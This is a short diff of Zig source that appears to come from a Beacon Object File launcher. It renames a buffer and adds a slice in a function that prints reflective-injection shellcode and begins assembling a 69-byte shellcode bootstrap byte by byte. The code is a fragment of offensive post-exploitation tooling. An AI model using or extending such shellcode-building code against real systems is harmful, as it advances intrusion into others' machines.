@@ -28,8 +28,9 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
 
     _ = beacon.printf(0, "ptr: %p len: %d\n%s\n", bof_launcher_bytes.ptr, bof_launcher_bytes.len, rdi_shellcode64);
 
-    var bootstrap_bytes: [69]u8 = undefined;
+    var bootstrap: [69]u8 = undefined;
     var bootstrap_i: usize = 0;
+    const bootstrap_bytes = bootstrap[0..];
 
     // call 0x5 (pushes next instruction address to stack)
     bootstrap_bytes[bootstrap_i] = 0xe8;
